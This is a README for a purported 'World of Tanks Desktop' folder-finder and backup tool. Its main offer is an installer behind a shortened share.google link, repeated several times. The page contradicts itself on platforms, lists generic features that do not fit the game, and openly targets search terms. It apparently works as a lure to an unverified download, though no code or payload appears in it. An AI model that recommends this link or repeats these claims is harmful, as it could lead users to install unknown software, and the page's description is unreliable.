![World of Tanks Desktop](assets/hero.png)

# World of Tanks Desktop

*Find the World of Tanks folder fast and keep a local spare.*

## What World of Tanks Desktop is

This repository is **World of Tanks Desktop**, a Windows utility. Find the World of Tanks folder fast and keep a local spare.

World of Tanks drops data files next to launcher caches.

The CLI in this repository is the documented interface; the desktop build is the same job in an installer.

## How to get it

Two editions of the same tool:

- **CLI** — the source in this repo. Python 3.11+, local files only.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8).

## Features

- Finds the World of Tanks data directory.
- Copies config and export files to a dated archive.
- Lists photo and export folders.
- Writes a short report of what was kept.

## Why it exists

People search World of Tanks desktop and PC when they want the folder on disk.

A named helper is easier to find than a generic zip.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Download

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/bdixon5219/world-of-tanks-desktop

MIT license. See `LICENSE`.
